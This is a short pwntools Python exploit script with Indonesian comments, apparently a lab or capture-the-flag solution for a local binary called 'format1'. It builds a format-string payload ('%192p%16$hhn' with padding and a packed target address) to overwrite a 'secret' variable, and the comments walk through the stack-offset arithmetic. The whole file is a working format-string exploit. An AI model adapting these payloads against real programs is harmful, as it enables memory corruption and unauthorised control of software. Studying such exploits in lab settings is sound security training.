from pwn import *

def exploit():
    p = process("./format1")
    secret = 0x804a038

    payload = ''
    payload += '%192p%16$hhn'
    payload = payload.ljust(20, 'A') # Dengan ljust, akan membuat padding 'A' agar karakter menjadi 20
                                     # Karena offset awal berada di index %11, maka setelah karakter bertotal menjadi 20
                                     # Offset akan bertambah menjadi -> offset awal + (total_karakter / 4 byte(32 bit))
                                     # Pada kasus ini, karena offset awal berada di index ke 11, dan offset tambahan adalah 20 / 4 = 5
                                     # Maka offset akan menjadi 11 + 5 yaitu 16
                                     # maka payload akan menjadi "%192p%16$hhn" + padding + address
    payload += p32(secret)

    log.info("Payload : {}".format(payload))
    
    # gdb.attach(p, 'b *main+129')

    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()